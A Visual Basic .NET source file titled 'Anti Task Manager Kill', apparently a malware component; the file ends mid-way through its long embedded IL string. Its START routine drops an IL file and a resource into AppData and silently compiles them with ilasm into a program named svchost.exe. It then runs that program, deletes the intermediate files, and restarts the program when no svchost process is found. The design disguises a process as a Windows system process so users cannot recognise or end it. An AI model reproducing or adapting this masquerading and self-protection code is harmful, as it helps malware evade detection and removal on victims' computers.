Public Class Anti_Task_Manager_Kill
    '************************************************
    '* Product : Anti Task Manager Kill VB.Net 2012 *
    '* Coder   : Mr.Wolf                            *
    '* Date    : 10-10-2014                         *
    '************************************************
    Public Shared MyProcessName As String = "" 'Put The Prcess Name In TaskManager
    Public Shared Sub START()
        If Not IO.File.Exists(KILP.Replace(".il", ".exe")) Then
re:
            IO.File.WriteAllBytes(RESP, Convert.FromBase64String(RES))
            IO.File.WriteAllText(KILP, KIL.Replace("%ProName%", MyProcessName))
            Try
                If IO.File.Exists(KILP) Then
                    Dim startInfo As New ProcessStartInfo
                    startInfo.FileName = Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe"
                    startInfo.Arguments = "/alignment=512 /QUIET " & KILP & " /output:" & KILP.Replace(".il", ".exe")
                    startInfo.CreateNoWindow = True
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo).WaitForExit()
                Else
                    GoTo re
                End If
            Catch ex As Exception
            End Try
            If IO.File.Exists(KILP) Then IO.File.Delete(KILP) : IO.File.Delete(RESP)
            Process.Start(KILP.Replace(".il", ".exe"))
        Else
            Dim p() As Process
            p = Process.GetProcessesByName("svchost")
            If Not (p.Length > 0) Then Process.Start(KILP.Replace(".il", ".exe"))
        End If
    End Sub
    Private Shared KILP As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\svchost.il"
    Private Shared RESP As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\svchost.Resources.resources"
    Private Shared RES As String = "zsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAAAAAAAAAAAAFBBRFBBRFC0AAAA"
    Private Shared KIL As String = ""& vbNewLine & _
"//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.1"& vbNewLine & _
"//  Copyright (c) Microsoft Corporation.  All rights reserved."& vbNewLine & _
"//  Product : Anti Task Manager Kill VB.Net 2012"& vbNewLine & _
"//  Coder   : Mr.Wolf"& vbNewLine & _
"//  Date    : 10-10-2014"& vbNewLine & _
"// Metadata version: v2.0.50727"& vbNewLine & _
".assembly extern mscorlib"& vbNewLine & _
"{"& vbNewLine & _
"  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4.."& vbNewLine & _
"  .ver 2:0:0:0"& vbNewLine & _
"}"& vbNewLine & _
".assembly extern Microsoft.VisualBasic"& vbNewLine & _
"{"& vbNewLine & _
"  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:"& vbNewLine & _
"  .ver 8:0:0:0"& vbNewLine & _
"}"& vbNewLine & _
".assembly extern System"& vbNewLine & _
"{"& vbNewLine & _
"  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4.."& vbNewLine & _
"  .ver 2:0:0:0"& vbNewLine & _
"}"& vbNewLine & _
".assembly svchost"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. "& vbNewLine & _
"                                                                                                  20 32 30 31 34 00 00 )                            //  2014.."& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 07 73 76 63 68 6F 73 74 00 00 )             // ...svchost.."& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 07 73 76 63 68 6F 73 74 00 00 )             // ...svchost.."& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) "& vbNewLine & _
""& vbNewLine & _
"  // --- The following custom attribute is added automatically, do not uncomment -------"& vbNewLine & _
"  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) "& vbNewLine & _
""& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx"& vbNewLine & _
"                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows."& vbNewLine & _
"  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0.."& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 36 31 31 30 36 39 32 65 2D 66 35 33 32   // ..$6110692e-f532"& vbNewLine & _
"                                                                                                  2D 34 63 36 39 2D 38 37 35 31 2D 32 37 66 39 62   // -4c69-8751-27f9b"& vbNewLine & _
"                                                                                                  34 64 33 66 61 36 65 00 00 )                      // 4d3fa6e.."& vbNewLine & _
"  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) "& vbNewLine & _
"  .hash algorithm 0x00008004"& vbNewLine & _
"  .ver 1:0:0:0"& vbNewLine & _
"}"& vbNewLine & _
".mresource public svchost.Resources.resources"& vbNewLine & _
"{"& vbNewLine & _
"  // Offset: 0x00000000 Length: 0x000000B4"& vbNewLine & _
"  // WARNING: managed resource file svchost.Resources.resources created"& vbNewLine & _
"}"& vbNewLine & _
".module svchost.exe"& vbNewLine & _
"// MVID: {3AB35FB3-B070-4CFC-80F8-733CE6E8517C}"& vbNewLine & _
".imagebase 0x00400000"& vbNewLine & _
".file alignment 0x00000200"& vbNewLine & _
".stackreserve 0x00100000"& vbNewLine & _
".subsystem 0x0002       // WINDOWS_GUI"& vbNewLine & _
".corflags 0x00000001    //  ILONLY"& vbNewLine & _
"// Image base: 0x02640000"& vbNewLine & _
""& vbNewLine & _
""& vbNewLine & _
"// =============== CLASS MEMBERS DECLARATION ==================="& vbNewLine & _
""& vbNewLine & _
".class private auto ansi svchost.My.MyApplication"& vbNewLine & _
"       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,"& vbNewLine & _
"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8."& vbNewLine & _
"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.."& vbNewLine & _
"  .method public specialname rtspecialname "& vbNewLine & _
"          instance void  .ctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       9 (0x9)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  ldarg.0"& vbNewLine & _
"    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()"& vbNewLine & _
"    IL_0006:  nop"& vbNewLine & _
"    IL_0007:  nop"& vbNewLine & _
"    IL_0008:  ret"& vbNewLine & _
"  } // end of method MyApplication::.ctor"& vbNewLine & _
""& vbNewLine & _
"} // end of class svchost.My.MyApplication"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi svchost.My.MyComputer"& vbNewLine & _
"       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,"& vbNewLine & _
"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8."& vbNewLine & _
"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.."& vbNewLine & _
"  .method public specialname rtspecialname "& vbNewLine & _
"          instance void  .ctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"    // Code size       10 (0xa)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldarg.0"& vbNewLine & _
"    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()"& vbNewLine & _
"    IL_0007:  nop"& vbNewLine & _
"    IL_0008:  nop"& vbNewLine & _
"    IL_0009:  ret"& vbNewLine & _
"  } // end of method MyComputer::.ctor"& vbNewLine & _
""& vbNewLine & _
"} // end of class svchost.My.MyComputer"& vbNewLine & _
""& vbNewLine & _
".class private auto ansi sealed beforefieldinit svchost.My.MyProject"& vbNewLine & _
"       extends [mscorlib]System.Object"& vbNewLine & _
"{"& vbNewLine & _
"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,"& vbNewLine & _
"                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8."& vbNewLine & _
"                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0.."& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"  .class auto ansi sealed nested assembly MyWebServices"& vbNewLine & _
"         extends [mscorlib]System.Object"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,"& vbNewLine & _
"                                                                                                         string,"& vbNewLine & _
"                                                                                                         string,"& vbNewLine & _
"                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se"& vbNewLine & _
"                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols"& vbNewLine & _
"                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP"& vbNewLine & _
"                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__"& vbNewLine & _
"                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo"& vbNewLine & _
"                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__.."& vbNewLine & _
"                                                                                                                     00 ) "& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"    .method public strict virtual instance bool "& vbNewLine & _
"            Equals(object o) cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       18 (0x12)"& vbNewLine & _
"      .maxstack  2"& vbNewLine & _
"      .locals init (bool V_0)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  ldarg.1"& vbNewLine & _
"      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)"& vbNewLine & _
"      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)"& vbNewLine & _
"      IL_000d:  stloc.0"& vbNewLine & _
"      IL_000e:  br.s       IL_0010"& vbNewLine & _
""& vbNewLine & _
"      IL_0010:  ldloc.0"& vbNewLine & _
"      IL_0011:  ret"& vbNewLine & _
"    } // end of method MyWebServices::Equals"& vbNewLine & _
""& vbNewLine & _
"    .method public strict virtual instance int32 "& vbNewLine & _
"            GetHashCode() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       12 (0xc)"& vbNewLine & _
"      .maxstack  1"& vbNewLine & _
"      .locals init (int32 V_0)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()"& vbNewLine & _
"      IL_0007:  stloc.0"& vbNewLine & _
"      IL_0008:  br.s       IL_000a"& vbNewLine & _
""& vbNewLine & _
"      IL_000a:  ldloc.0"& vbNewLine & _
"      IL_000b:  ret"& vbNewLine & _
"    } // end of method MyWebServices::GetHashCode"& vbNewLine & _
""& vbNewLine & _
"    .method assembly hidebysig instance class [mscorlib]System.Type "& vbNewLine & _
"            GetType() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      // Code size       16 (0x10)"& vbNewLine & _
"      .maxstack  1"& vbNewLine & _
"      .locals init (class [mscorlib]System.Type V_0)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldtoken    svchost.My.MyProject/MyWebServices"& vbNewLine & _
"      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)"& vbNewLine & _
"      IL_000b:  stloc.0"& vbNewLine & _
"      IL_000c:  br.s       IL_000e"& vbNewLine & _
""& vbNewLine & _
"      IL_000e:  ldloc.0"& vbNewLine & _
"      IL_000f:  ret"& vbNewLine & _
"    } // end of method MyWebServices::GetType"& vbNewLine & _
""& vbNewLine & _
"    .method public strict virtual instance string "& vbNewLine & _
"            ToString() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      // Code size       12 (0xc)"& vbNewLine & _
"      .maxstack  1"& vbNewLine & _
"      .locals init (string V_0)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  call       instance string [mscorlib]System.Object::ToString()"& vbNewLine & _
"      IL_0007:  stloc.0"& vbNewLine & _
"      IL_0008:  br.s       IL_000a"& vbNewLine & _
""& vbNewLine & _
"      IL_000a:  ldloc.0"& vbNewLine & _
"      IL_000b:  ret"& vbNewLine & _
"    } // end of method MyWebServices::ToString"& vbNewLine & _
""& vbNewLine & _
"    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       32 (0x20)"& vbNewLine & _
"      .maxstack  2"& vbNewLine & _
"      .locals init (!!T V_0,"& vbNewLine & _
"               bool V_1)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  box        !!T"& vbNewLine & _
"      IL_0007:  ldnull"& vbNewLine & _
"      IL_0008:  ceq"& vbNewLine & _
"      IL_000a:  stloc.1"& vbNewLine & _
"      IL_000b:  ldloc.1"& vbNewLine & _
"      IL_000c:  brfalse.s  IL_0018"& vbNewLine & _
""& vbNewLine & _
"      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()"& vbNewLine & _
"      IL_0013:  stloc.0"& vbNewLine & _
"      IL_0014:  br.s       IL_001e"& vbNewLine & _
""& vbNewLine & _
"      IL_0016:  br.s       IL_001d"& vbNewLine & _
""& vbNewLine & _
"      IL_0018:  nop"& vbNewLine & _
"      IL_0019:  ldarg.0"& vbNewLine & _
"      IL_001a:  stloc.0"& vbNewLine & _
"      IL_001b:  br.s       IL_001e"& vbNewLine & _
""& vbNewLine & _
"      IL_001d:  nop"& vbNewLine & _
"      IL_001e:  ldloc.0"& vbNewLine & _
"      IL_001f:  ret"& vbNewLine & _
"    } // end of method MyWebServices::Create__Instance__"& vbNewLine & _
""& vbNewLine & _
"    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       18 (0x12)"& vbNewLine & _
"      .maxstack  2"& vbNewLine & _
"      .locals init (!!T V_0)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.1"& vbNewLine & _
"      IL_0002:  ldloca.s   V_0"& vbNewLine & _
"      IL_0004:  initobj    !!T"& vbNewLine & _
"      IL_000a:  ldloc.0"& vbNewLine & _
"      IL_000b:  stobj      !!T"& vbNewLine & _
"      IL_0010:  nop"& vbNewLine & _
"      IL_0011:  ret"& vbNewLine & _
"    } // end of method MyWebServices::Dispose__Instance__"& vbNewLine & _
""& vbNewLine & _
"    .method public specialname rtspecialname "& vbNewLine & _
"            instance void  .ctor() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      // Code size       10 (0xa)"& vbNewLine & _
"      .maxstack  8"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()"& vbNewLine & _
"      IL_0007:  nop"& vbNewLine & _
"      IL_0008:  nop"& vbNewLine & _
"      IL_0009:  ret"& vbNewLine & _
"    } // end of method MyWebServices::.ctor"& vbNewLine & _
""& vbNewLine & _
"  } // end of class MyWebServices"& vbNewLine & _
""& vbNewLine & _
"  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>"& vbNewLine & _
"         extends [mscorlib]System.Object"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) "& vbNewLine & _
"    .field private static !T m_ThreadStaticValue"& vbNewLine & _
"    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    .method assembly specialname instance !T "& vbNewLine & _
"            get_GetInstance() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       38 (0x26)"& vbNewLine & _
"      .maxstack  2"& vbNewLine & _
"      .locals init (!T V_0,"& vbNewLine & _
"               bool V_1)"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue"& vbNewLine & _
"      IL_0006:  box        !T"& vbNewLine & _
"      IL_000b:  ldnull"& vbNewLine & _
"      IL_000c:  ceq"& vbNewLine & _
"      IL_000e:  stloc.1"& vbNewLine & _
"      IL_000f:  ldloc.1"& vbNewLine & _
"      IL_0010:  brfalse.s  IL_001c"& vbNewLine & _
""& vbNewLine & _
"      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()"& vbNewLine & _
"      IL_0017:  stsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue"& vbNewLine & _
"      IL_001c:  ldsfld     !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue"& vbNewLine & _
"      IL_0021:  stloc.0"& vbNewLine & _
"      IL_0022:  br.s       IL_0024"& vbNewLine & _
""& vbNewLine & _
"      IL_0024:  ldloc.0"& vbNewLine & _
"      IL_0025:  ret"& vbNewLine & _
"    } // end of method ThreadSafeObjectProvider`1::get_GetInstance"& vbNewLine & _
""& vbNewLine & _
"    .method public specialname rtspecialname "& vbNewLine & _
"            instance void  .ctor() cil managed"& vbNewLine & _
"    {"& vbNewLine & _
"      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) "& vbNewLine & _
"      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"      // Code size       10 (0xa)"& vbNewLine & _
"      .maxstack  8"& vbNewLine & _
"      IL_0000:  nop"& vbNewLine & _
"      IL_0001:  ldarg.0"& vbNewLine & _
"      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()"& vbNewLine & _
"      IL_0007:  nop"& vbNewLine & _
"      IL_0008:  nop"& vbNewLine & _
"      IL_0009:  ret"& vbNewLine & _
"    } // end of method ThreadSafeObjectProvider`1::.ctor"& vbNewLine & _
""& vbNewLine & _
"    .property instance !T GetInstance()"& vbNewLine & _
"    {"& vbNewLine & _
"      .get instance !T svchost.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()"& vbNewLine & _
"    } // end of property ThreadSafeObjectProvider`1::GetInstance"& vbNewLine & _
"  } // end of class ThreadSafeObjectProvider`1"& vbNewLine & _
""& vbNewLine & _
"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> m_ComputerObjectProvider"& vbNewLine & _
"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> m_AppObjectProvider"& vbNewLine & _
"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider"& vbNewLine & _
"  .field private static initonly class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider"& vbNewLine & _
"  .method private specialname rtspecialname static "& vbNewLine & _
"          void  .cctor() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       42 (0x2a)"& vbNewLine & _
"    .maxstack  8"& vbNewLine & _
"    IL_0000:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer>::.ctor()"& vbNewLine & _
"    IL_0005:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> svchost.My.MyProject::m_ComputerObjectProvider"& vbNewLine & _
"    IL_000a:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication>::.ctor()"& vbNewLine & _
"    IL_000f:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> svchost.My.MyProject::m_AppObjectProvider"& vbNewLine & _
"    IL_0014:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()"& vbNewLine & _
"    IL_0019:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> svchost.My.MyProject::m_UserObjectProvider"& vbNewLine & _
"    IL_001e:  newobj     instance void class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices>::.ctor()"& vbNewLine & _
"    IL_0023:  stsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyProject/MyWebServices> svchost.My.MyProject::m_MyWebServicesObjectProvider"& vbNewLine & _
"    IL_0028:  nop"& vbNewLine & _
"    IL_0029:  ret"& vbNewLine & _
"  } // end of method MyProject::.cctor"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static class svchost.My.MyComputer "& vbNewLine & _
"          get_Computer() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       16 (0x10)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class svchost.My.MyComputer V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer> svchost.My.MyProject::m_ComputerObjectProvider"& vbNewLine & _
"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyComputer>::get_GetInstance()"& vbNewLine & _
"    IL_000b:  stloc.0"& vbNewLine & _
"    IL_000c:  br.s       IL_000e"& vbNewLine & _
""& vbNewLine & _
"    IL_000e:  ldloc.0"& vbNewLine & _
"    IL_000f:  ret"& vbNewLine & _
"  } // end of method MyProject::get_Computer"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static class svchost.My.MyApplication "& vbNewLine & _
"          get_Application() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       16 (0x10)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class svchost.My.MyApplication V_0)"& vbNewLine & _
"    IL_0000:  nop"& vbNewLine & _
"    IL_0001:  ldsfld     class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication> svchost.My.MyProject::m_AppObjectProvider"& vbNewLine & _
"    IL_0006:  callvirt   instance !0 class svchost.My.MyProject/ThreadSafeObjectProvider`1<class svchost.My.MyApplication>::get_GetInstance()"& vbNewLine & _
"    IL_000b:  stloc.0"& vbNewLine & _
"    IL_000c:  br.s       IL_000e"& vbNewLine & _
""& vbNewLine & _
"    IL_000e:  ldloc.0"& vbNewLine & _
"    IL_000f:  ret"& vbNewLine & _
"  } // end of method MyProject::get_Application"& vbNewLine & _
""& vbNewLine & _
"  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User "& vbNewLine & _
"          get_User() cil managed"& vbNewLine & _
"  {"& vbNewLine & _
"    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) "& vbNewLine & _
"    // Code size       16 (0x10)"& vbNewLine & _
"    .maxstack  1"& vbNewLine & _
"    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)"& vbNewLine & _
